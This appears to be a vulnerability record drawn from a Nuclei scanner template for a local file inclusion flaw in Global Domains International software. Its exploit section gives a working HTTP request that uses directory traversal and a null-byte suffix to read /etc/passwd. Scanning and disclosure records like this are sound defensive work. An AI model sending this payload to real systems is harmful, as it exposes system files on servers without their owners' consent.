# Nuclei Template: Global Domains International - Local File Inclusion
**Template ID:** global-domains-lfi
**Vulnerability Class:** Path Traversal
**Severity:** High
**CWE:** CWE-22
**Source:** Nuclei Template (`global-domains-lfi.yaml`)

## Vulnerability Information & PoC

## Description
Global Domains International is vulnerable to local file inclusion.

## Steps to reproduce / Exploit Payload
```http
GET {{BaseURL}}/kvmlm2/index.dhtml?fname=&language=../../../../../../../../../../etc/passwd%00.jpg&lname=&sponsor=gdi&template=11
```

## References
- https://cxsecurity.com/issue/WLB-2018020247
- http://www.nic.ws
